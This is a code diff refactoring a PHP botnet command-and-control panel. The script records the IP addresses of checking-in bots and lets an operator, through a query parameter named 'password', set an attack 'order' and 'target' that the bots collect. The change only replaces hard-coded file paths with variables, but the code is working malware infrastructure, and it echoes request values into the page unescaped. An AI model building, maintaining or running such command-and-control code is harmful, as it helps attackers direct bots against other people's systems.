@@ -20,9 +20,12 @@
 ########################################################################
 */
 
+$configFile = "data/config";
+$botFile = "data/bots";
+
 // load config (parameters for attack)
-$conf = fopen("data/config", "r");
-$content = fread($conf, filesize("data/config"));
+$conf = fopen($configFile, "r");
+$content = fread($conf, filesize($configFile));
 fclose($conf);
 $content = explode("\n", $content);
 
@@ -37,8 +40,8 @@ if($_GET['p'] == "bot") {
 	// save bot parameter
 	$clientIpAddress = $_SERVER["REMOTE_ADDR"];
 	// read bots
-	$bots = fopen("data/bots", "r");
-	$botsContent = fread($bots, filesize("data/bots"));
+	$bots = fopen($botFile, "r");
+	$botsContent = fread($bots, filesize($botFile));
 	fclose($bots);
 	$botsContent = explode("\n", $botsContent);
 	$writeBotsContent = "";
@@ -64,15 +67,15 @@ if($_GET['p'] == "bot") {
 		$writeBotsContent = $writeBotsContent.$clientIpAddress." ".$timestamp;
 	}
 
-	$writeBots = fopen("data/bots", "w");
+	$writeBots = fopen($botFile, "w");
 	fwrite($writeBots, $writeBotsContent);
 	fclose($writeBots);
 }
 elseif($_GET['p'] == "password") {
 	// delete timed out bots
 	// read bots
-        $bots = fopen("data/bots", "r");
-        $botsContent = fread($bots, filesize("data/bots"));
+        $bots = fopen($botFile, "r");
+        $botsContent = fread($bots, filesize($botFile));
         fclose($bots);
         $botsContent = explode("\n", $botsContent);
         $writeBotsContent = "";
@@ -87,13 +90,13 @@ elseif($_GET['p'] == "password") {
                 }
 
 	}
-	$writeBots = fopen("data/bots", "w");
+	$writeBots = fopen($botFile, "w");
         fwrite($writeBots, $writeBotsContent);
         fclose($writeBots);
 
 	// save new config
 	if($_GET['order'] != "" && $_GET['target'] != "") {
-		$writeConf = fopen("data/config", "w");
+		$writeConf = fopen($configFile, "w");
 		fwrite($writeConf, $_GET['order']."\n".$_GET['target']);
 		fclose($writeConf);
 		$order = $_GET['order'];
@@ -107,8 +110,8 @@ elseif($_GET['p'] == "password") {
 	print "<td>".$order."</td>";
 	print "<td>".$target."</td>";
 	print "<td>";
-	$activeBots = fopen("data/bots", "r");
-	$content = fread($activeBots, filesize("data/bots"));
+	$activeBots = fopen($botFile, "r");
+	$content = fread($activeBots, filesize($botFile));
 	fclose($activeBots);
 	$number = explode("\n", $content);
 	print count($number)-1;
